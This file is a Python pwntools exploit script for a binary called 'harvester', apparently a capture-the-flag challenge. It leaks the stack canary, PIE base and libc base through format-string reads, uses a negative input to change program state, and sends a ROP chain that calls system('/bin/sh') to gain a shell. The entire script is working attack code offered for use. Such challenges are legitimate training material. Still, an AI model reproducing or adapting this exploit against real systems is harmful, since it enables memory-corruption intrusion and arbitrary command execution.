#!/usr/bin/python3
# Author: Hack.You

from pwn import *
import warnings
import re

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break main
piebase
continue
'''.format(**locals())

# Binary filename
exe = './harvester'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False) 
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

libc = elf.libc

# Leak stack canary address & pie address
stack_leak = '%19$p'
io.recvuntil('>')
io.sendline('1')
io.recvuntil('>')
io.sendline(stack_leak.encode())
io.recvuntil(b'Your choice is:')
# Extract the canary address 
leak = io.recvline()
canary_address = re.findall(rb"0x[0-9a-zA-Z]+" , leak)
canary = int(canary_address[0], 16)
info("Canary address: %#x", canary)

# Leak pie address
pie_leak = '%23$p'
io.recvuntil('>')   
io.sendline('1')
io.recvuntil('>')
io.sendline(pie_leak.encode())
io.recvuntil(b'Your choice is:')  
# Extract pie address
leak = io.recvline()
pie_address = re.findall(rb"0x[0-9a-zA-Z]+" , leak)
leakedpie = int(pie_address[0], 16)  
info("Leaked Pie address: %#x", leakedpie)
# Calculate pie base address
elf.address = leakedpie - 0xf90
info("Piebase address: %#x", elf.address)
  
# Make pie number equal to 21
io.recvuntil('>')
io.sendline('2')
io.recvuntil('>')
io.sendline('y')
io.recvuntil('>')
io.sendline('-11')

# Leak libc address
nano_leak = '%3$p' # 0x7ffff7e983b3 <__GI___clock_nanosleep+35>:     0x66c3d8f7
io.recvuntil('>')   
io.sendline('1')
io.recvuntil('>')
io.sendline(nano_leak.encode())
io.recvuntil(b'Your choice is:')  
leak = io.recvline()
nano_address = re.findall(rb"0x[0-9a-zA-Z]+" , leak)
nano = int(nano_address[0], 16)  
nanosleep = nano - 35
info("Leaked nano address: %#x", nanosleep)

# Calculate libc base address
libc.address = nanosleep - libc.symbols['nanosleep']
info("Libc base address %#x", libc.address)

# Craft exploit
offset = 40
padding = 8
pop_rdi = elf.address + 0x0000000000001063 # pop rdi; ret; 
ret = elf.address + 0x0000000000000284 # ret; 
sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
info("/bin/sh address %#x", sh)
info("System address %#x", system)

payload = flat({
    offset: [
        canary,
        padding,
        pop_rdi,
        sh,
        ret,
        system
    ]
})

io.recvuntil('>')
io.sendline('3')
io.recvuntil('>')

io.sendline(payload)

io.interactive()
